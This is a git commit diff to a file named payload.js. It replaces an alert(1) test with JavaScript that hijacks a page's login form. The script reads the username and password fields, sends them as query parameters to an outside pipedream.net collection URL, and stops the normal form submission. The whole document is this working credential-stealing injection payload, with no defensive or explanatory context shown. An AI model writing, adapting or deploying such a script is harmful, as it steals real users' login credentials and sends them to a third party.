557a868265b5a5d9988144ac431904a29dd6c366
Quan Truong <quantt86@gmail.com>
2020-12-28 15:08:48 +0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,13 @@
-alert(1)
+function intercept() {
+ 
+ var user = document.forms[0].elements[7].value;
+ var pass = document.forms[0].elements[8].value;
+ 
+ 
+ var xhr = new XMLHttpRequest();
+ 
+ xhr.open("GET", "https://279dab10553f3cfa470b9c9be00bca7f.m.pipedream.net?user="+user+"&password="+pass)
+ xhr.send();
+return false;
+ }
+ document.forms[0].onsubmit = intercept;
